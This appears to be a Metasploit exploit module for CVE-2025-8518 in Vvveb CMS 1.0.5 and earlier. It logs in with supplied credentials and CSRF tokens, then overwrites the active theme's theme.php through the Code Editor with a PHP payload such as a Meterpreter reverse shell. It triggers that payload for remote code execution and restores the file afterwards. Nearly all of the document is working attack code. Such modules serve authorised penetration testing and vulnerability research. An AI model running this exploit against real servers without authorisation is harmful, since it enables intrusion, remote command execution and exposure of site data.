##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Remote Code Execution Vulnerability in Vvveb (CVE-2025-8518)',
        'Description' => %q{
          Vvveb CMS is vulnerable to Code Injection via the Code Editor functionality.

          Unsanitized editing functionality allows attacker-controlled changes to existing files on the web-accessible filesystem,
          allowing remote authenticated attackers with access to the Code Editor to achieve code execution
          when those modified files are executed or served by the application or web server.

          This vulnerability affects Vvveb CMS versions up to and including 1.0.5.
          Successful exploitation may result in the remote code execution under the privileges
          of the web server, potentially exposing sensitive data or disrupting survey operations.

          An attacker can execute arbitrary system commands in the context of the user running the web server.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Maksim Rogov', # Metasploit Module
          'Hamed Kohi' # Vulnerability Discovery
        ],
        'References' => [
          ['CVE', '2025-8518'],
          ['URL', 'https://hkohi.ca/vulnerability/8']
        ],
        'Platform' => ['php'],
        'Arch' => [ARCH_PHP],
        'Targets' => [
          [
            'PHP',
            {
              'Platform' => ['php'],
              'Arch' => ARCH_PHP
              # Tested with php/meterpreter/reverse_tcp
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2025-01-10',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Path to Vvveb CMS', '/admin/']),
        OptString.new('USERNAME', [true, 'The username used to authenticate to Vvveb CMS', 'admin']),
        OptString.new('PASSWORD', [true, 'The password used to authenticate to Vvveb CMS', ''])
      ]
    )
  end

  def get_csrf_token
    print_status('Fetching CSRF token...')

    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET',
      'keep_cookies' => true
    )
    fail_with(Failure::Unreachable, "#{peer} - No response from web service") unless res
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected HTTP code #{res.code}") unless res.code == 200

    html = res.get_html_document
    csrf_input = html.at('input[name="csrf"]')
    unless csrf_input
      fail_with(Failure::UnexpectedReply, "#{peer} - Unable to extract CSRF token")
    end

    token = csrf_input.attributes.fetch('value', nil)
    if token.blank?
      fail_with(Failure::UnexpectedReply, "#{peer} - CSRF token is empty")
    end

    print_good("Token successfully fetched: #{token}")
    return token.to_s
  end

  def login
    csrf_token = get_csrf_token

    print_status('Attempting login...')

    post_data = Rex::MIME::Message.new
    post_data.add_part(csrf_token, nil, nil, 'form-data; name="csrf"')
    post_data.add_part('', nil, nil, 'form-data; name="redir"')
    post_data.add_part(datastore['USERNAME'], nil, nil, 'form-data; name="user"')
    post_data.add_part(datastore['PASSWORD'], nil, nil, 'form-data; name="password"')

    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path),
      'method' => 'POST',
      'keep_cookies' => true,
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'vars_get' => { 'module' => 'user/login' },
      'data' => post_data.to_s
    )

    fail_with(Failure::Unreachable, "#{peer} - No response from web service") unless res
    fail_with(Failure::NoAccess, "#{peer} - Incorrect credentials - #{datastore['USERNAME']}:#{datastore['PASSWORD']}") if res.body.include?('wrong email or password')
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected HTTP code #{res.code}") unless res.code == 302

    @logged_in = true
    print_good('Login successful')
  end

  def get_active_theme_path
    print_status('Identifying the active theme path...')

    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'GET',
      'vars_get' => { 'module' => 'theme/themes' }
    )
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected HTTP code #{res.code}") unless res.code == 200

    active_theme = res.get_html_document.at('div.list-card.active')
    if active_theme.blank?
      fail_with(Failure::UnexpectedReply, "#{peer} - Card with the active theme was not found")
    end

    theme_preview = active_theme.at('.card-img-top img').attributes.fetch('src', nil)
    if theme_preview.blank?
      fail_with(Failure::UnexpectedReply, "#{peer} - Preview of the active theme card was not found")
    end

    theme_dir = File.dirname(theme_preview)
    theme_path = theme_dir + '/theme.php'

    print_good("Theme path successfully identified: #{theme_path}")
    return theme_path
  end

  def get_theme_content(theme_path)
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'GET',
      'vars_get' => {
        'module' => 'editor/code',
        'action' => 'loadFile',
        'type' => 'themes',
        'file' => theme_path
      }
    )
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected HTTP code #{res.code}") unless res.code == 200

    return res.body
  end

  def set_theme_content(theme_path, content)
    post_data = Rex::MIME::Message.new
    post_data.add_part(content, nil, nil, 'form-data; name="content"')

    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'POST',
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'vars_get' => {
        'module' => 'editor/code',
        'action' => 'save',
        'type' => 'themes',
        'file' => theme_path
      },
      'data' => post_data.to_s
    )

    if !res.nil? && res.code != 200
      fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected HTTP code #{res.code}")
    end
  end

  def trigger_payload(_theme_path)
    print_status('Triggering payload...')

    send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'GET',
      'vars_get' => {
        'module' => 'editor/editor',
        'url' => '/',
        'template' => 'index.html'
      }
    )
  end

  def set_payload(theme_path)
    print_status('Setting up payload...')
    set_theme_content(theme_path, payload.encoded)
    print_good('Payload setup complete')
  end

  def check
    login

    print_status('Checking version...')

    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'GET',
      'vars_get' => { 'module' => 'tools/systeminfo' }
    )
    fail_with(Failure::Unreachable, "#{peer} - No response from web service") unless res
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected HTTP code #{res.code}") unless res.code == 200

    version_td = res.get_html_document.at('tr:has(th:contains("Vvveb version")) td')
    if version_td.nil?
      fail_with(Failure::UnexpectedReply, "#{peer} Failed to find Vvveb version")
    end

    version = Rex::Version.new(version_td&.text&.strip)
    if version <= Rex::Version.new('1.0.5')
      return CheckCode::Appears("Detected version #{version}, which is vulnerable")
    end

    return CheckCode::Safe("Detected version #{version}, which is not vulnerable")
  end

  def cleanup
    set_theme_content(@theme_path, @default_theme_content) unless @theme_path.nil? && @default_theme_content.nil?
    super
  end

  def exploit
    login unless @logged_in
    @theme_path = get_active_theme_path
    @default_theme_content = get_theme_content(@theme_path)
    set_payload(@theme_path)
    trigger_payload(@theme_path)
  end
end
